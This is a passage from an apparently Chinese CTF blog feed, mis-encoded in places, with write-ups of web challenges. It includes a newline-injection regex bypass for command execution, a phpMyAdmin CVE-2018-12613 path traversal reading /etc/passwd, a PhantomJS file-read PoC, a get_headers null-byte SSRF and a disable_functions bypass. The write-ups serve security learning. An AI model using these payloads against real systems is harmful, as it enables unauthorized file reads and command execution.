number">99</span><span class="token operator">%</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><pre class="language-none"><code class="language-none">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</code></pre><p>æ ¹ç›®å½•ä¸‹æœ‰<code>readflag</code> å’Œ  <code>flag</code>æ–‡ä»¶ï¼Œ<code>flag</code>è¯»å–æƒé™ä¸å¤Ÿï¼Œ<code>readflag</code>ä¸èƒ½æ‰§è¡Œï¼Œéœ€è¦ç»•è¿‡<code>disable_function</code>ï¼Œåˆ©ç”¨èšå‰‘çš„æ’ä»¶ç»•è¿‡ï¼Œæ‰§è¡Œååœ¨èšå‰‘ç»ˆç«¯æ‰§è¡Œ<code>/readflag</code>å³å¯è¯»åˆ°flag</p><h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>é¢˜ç›®éœ€è¦ç”¨jsonæ ¼å¼çš„æ•°æ®è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œå¦‚ï¼š<code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code></p><p>è¿™é¢˜åº”è¯¥æ˜¯æ¯”èµ›æ—¶é¢˜ç›®ç»™å‡ºäº†æºç buuä¸Šæ²¡æ”¾ï¼Œæºç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PATH=/home/rceservice/jail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Attempting to run command:&lt;br/>'</span><span class="token punctuation">;</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Invalid input'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿</p><p><code>putenv(&#39;PATH=/home/rceservice/jail&#39;)</code>ï¼Œé™åˆ¶äº†å‘½ä»¤æ‰§è¡Œçš„ç¯å¢ƒï¼Œç”¨å…¨è·¯å¾„å°±å¯ä»¥äº†ï¼Œé—®é¢˜æ˜¯wafçš„ç»•è¿‡</p><p>æˆ‘ä»¬çŸ¥é“phpæ­£åˆ™åŒ¹é…åœ¨é»˜è®¤æ¨¡å¼ä¸‹è®¤ä¸ºç›®æ ‡å­—ç¬¦ä¸²æ˜¯ç”±å•è¡Œå­—ç¬¦ç»„æˆçš„ï¼Œå³ä¸åŒ¹é…å¤šè¡Œï¼Œäºæ˜¯å³å¯ä»¥ç”¨%0Aç»•è¿‡ï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">&#123;%0a&quot;cmd&quot;:&quot;ls &#x2F;home&#x2F;rceservice&quot;%0a&#125;    &#x2F;&#x2F;flag jail&#123;%0a&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0a&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFé¢˜ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-CVE</title>
      <link href="posts/67caa546/"/>
      <url>posts/67caa546/</url>
      
        <content type="html"><![CDATA[<h3 id="CVE-2018-12613"><a href="#CVE-2018-12613" class="headerlink" title="CVE-2018-12613"></a>CVE-2018-12613</h3><p><strong>2019GWCTFâ€”æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</strong></p><p>æ ¸å¿ƒâ€”â€”â€”â€”â€”â€“phpmyadmin[CVE-2018-12613]</p><p>åˆ©ç”¨dirbæ‰«åˆ°phpmyadminåå°</p><p>åˆ©ç”¨è¯¥æ¼æ´å¯è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–</p><span id="more"></span><pre class="language-powershell" data-language="powershell"><code class="language-powershell">?target=db_sql<span class="token punctuation">.</span>php<span class="token operator">%</span>253f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd?target=db_sql<span class="token punctuation">.</span>php<span class="token operator">%</span>253f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>flag</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CVE/image-179.png" alt loading="lazy"></p><p>æ¼æ´å¤ç°ä»‹ç»ä¸åˆ©ç”¨ï¼š</p><ul><li>é¦–å‘ï¼š<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd">ChaMd5å®‰å…¨å›¢é˜Ÿ</a></li><li>å¤§ä¸“æ ï¼š<a href="https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/">https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/</a></li><li>Freebufï¼š<a href="https://www.freebuf.com/column/207707.html">https://www.freebuf.com/column/207707.html</a></li></ul><h3 id="CVE-2019-17221"><a href="#CVE-2019-17221" class="headerlink" title="CVE-2019-17221"></a>CVE-2019-17221</h3><p><strong>WEB_RemoteImageDownloader</strong></p><p>æ ¸å¿ƒâ€”â€”â€”â€”â€”â€“PhantomJSä»»æ„æ–‡ä»¶è¯»å–[CVE-2019-17221]</p><p><a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/">Breaching the perimeter â€“ PhantomJs Arbitrary file read</a></p><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%94%B6%E9%9B%86/image-20200506121650092.png" alt loading="lazy"></p><p>POC</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  x<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">;</span>  x<span class="token punctuation">.</span><span class="token function-variable function">onload</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  x<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"file:///flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  x<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>å°†htmlä¿å­˜åˆ°è‡ªå·±çš„å…¬ç½‘ipä¸Šï¼Œç„¶åé¢˜ç›®ç•Œé¢ä¸‹è½½å³å¯ï¼Œæœ€åå¾—åˆ°flagçš„å›¾ç‰‡</p><h3 id="CVE-2020-7066"><a href="#CVE-2020-7066" class="headerlink" title="CVE-2020-7066"></a>CVE-2020-7066</h3><p>CVEä»‹ç»ï¼š</p><pre class="language-none"><code class="language-none">In PHP versions 7.2.x below 7.2.29, 7.3.x below 7.3.16 and 7.4.x below 7.4.4, while using get_headers() with user-supplied URL, if the URL contains zero (\0) character, the URL will be silently truncated at it. This may cause some software to make incorrect assumptions about the target of the get_headers() and possibly send some information to a wrong server.</code></pre><p>PHP 7.2.29ä¹‹å‰çš„7.2.xç‰ˆæœ¬ã€7.3.16ä¹‹å‰çš„7.3.xç‰ˆæœ¬å’Œ7.4.4ä¹‹å‰çš„7.4.xç‰ˆæœ¬ä¸­çš„<code>get_headers()</code>å‡½æ•°å­˜åœ¨å®‰å…¨æ¼æ´</p><p>å°†<code>get_headers()</code>ä¸ç”¨æˆ·æä¾›çš„URLä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå¦‚æœURLåŒ…å«é›¶<code>(\0)</code>å­—ç¬¦ï¼Œåˆ™URLå°†è¢«é™é»˜åœ°æˆªæ–­ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´æŸäº›è½¯ä»¶å¯¹<code>get_headers()</code>çš„ç›®æ ‡åšå‡ºé”™è¯¯çš„å‡è®¾ï¼Œå¹¶å¯èƒ½å°†æŸäº›ä¿¡æ¯å‘é€åˆ°é”™è¯¯çš„æœåŠ¡å™¨ã€‚</p><p><strong>[GKCTF2020]cveç‰ˆç­¾åˆ°</strong></p><p>ç‚¹è¿›å»é¢˜ç›®</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200625130103332.png" alt loading="lazy"></p><p>ç‚¹å‡»View CTFHubåUrlè¯·æ±‚ä¸€ä¸ªgetå‚æ•°ï¼Œ<code>?url=http://www.ctfhub.com</code>ï¼Œçœ‹ç€åƒSSRFï¼Œå†ç»“åˆé¢˜ç›®æç¤ºè¿™ä¸ªCVEæ¼æ´ï¼Œè¿˜æœ‰åœ¨è¯·æ±‚è¿”å›å¤´é‡Œæœ‰ä¸€ä¸ª<code>Hintï¼šFlag in localhost</code></p><p>äºæ˜¯è¯·æ±‚ï¼š<code>?url=http://localhost%00.ctfhub.com</code>å¾—åˆ°å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200625130420379.png" alt loading="lazy"></p><p>äºæ˜¯è¯·æ±‚<code>?url=http://127.0.0.123%00.ctfhub.com</code>ï¼Œå¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFé¢˜ </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-å…¶å®ƒ</title>
      <link href="posts/5d485480/"/>
      <url>posts/5d485480/</url>
      
        <content type="html"><![CDATA[<h1 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h1><h2 id="ç™¾åº¦æ¯ä¹æœˆåœºCode"><a href="#ç™¾åº¦æ¯ä¹æœˆåœºCode" class="headerlink" title="ç™¾åº¦æ¯ä¹æœˆåœºCode"></a>ç™¾åº¦æ¯ä¹æœˆåœºCode</h2><p>ç•Œé¢ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219214921326.png" alt loading="lazy"></p><p>urlï¼š<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=hei.jpg</code>ï¼ŒæŸ¥çœ‹æºç ï¼š</p><span id="more"></span><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215138731.png" alt loading="lazy"></p><p>çŒœæµ‹å­˜åœ¨æ–‡ä»¶åŒ…å«è¯»å–æ–‡ä»¶æ“ä½œï¼Œäºæ˜¯è®¿é—®<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=index.php</code>æŸ¥çœ‹æºç ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215307566.png" alt loading="lazy"></p><p>base64è§£å¯†åå¾—åˆ°index.phpçš„æºç ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;title>file:'</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/title>'</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/gif;base64,"</span><span class="token operator">.</span><span class="token variable">$txt</span><span class="token operator">.</span><span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token comment">/* * Can you find the flag file? * */</span><span class="token delimiter important">?></span></span></code></pre><p>æ³¨æ„æ³¨é‡Šé‡Œçš„è¿™è¯å¥<code>Created by PhpStorm</code>ï¼Œæ˜¯ç”¨<code>PhpStorm</code>ç¼–è¾‘å™¨å†™çš„ï¼Œç”¨è¿™ä¸ªç¼–è¾‘å™¨å†™çš„å·¥ç¨‹æ–‡ä»¶ä¸‹ä¼šæœ‰ä¸€ä¸ª<code>.idea</code>æ–‡ä»¶å¤¹ï¼Œ<a href="https://segmentfault.com/q/1010000008644646">è¯¦</a>ï¼Œç±»ä¼¼äºè¿™ä¸ªé¡¹ç›®çš„æ ¹ç›®å½•æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«äº†ä¸€äº›xmlæ–‡ä»¶ï¼ˆé…ç½®ï¼‰ã€‚</p><p>äºæ˜¯è®¿é—®<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/.idea/workspace.xml</code>å¾—åˆ°ä¸€ä¸ªxmlé¡µé¢ï¼Œæå–å…¶ä¸­æœ‰ç”¨ä¿¡æ¯</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219220208401.png" alt loading="lazy"></p><p>ç»“åˆ<code>index.php</code>çš„æºç åˆ©ç”¨<code>config</code>ä»£æ›¿<code>_</code>ï¼Œäºæ˜¯è®¿é—®<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php</code>å¾—åˆ°<code>fl3g_ichuqiu.php</code>çš„æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Created by PhpStorm. * Date: 2015/11/16 * Time: 1:31 */</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span><span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">random</span><span class="token punctuation">(</span><span class="token variable">$length</span><span class="token punctuation">,</span> <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$hash</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token variable">$max</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$hash</span> <span class="token operator">.=</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$max</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$hash</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$tmp</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$tmp</span><span class="token punctuation">;</span>    <span class="token variable">$rnd</span><span class="token operator">=</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$ttmp</span> <span class="token operator">.=</span> <span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token variable">$key</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$s</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token operator">.</span><span class="token variable">$ttmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$txt</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$rnd</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$rnd</span><span class="token operator">.</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$s</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$tmp</span> <span class="token operator">.=</span> <span class="token variable">$txt</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$s</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$tmp1</span> <span class="token operator">.=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$tmp</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$tmp1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 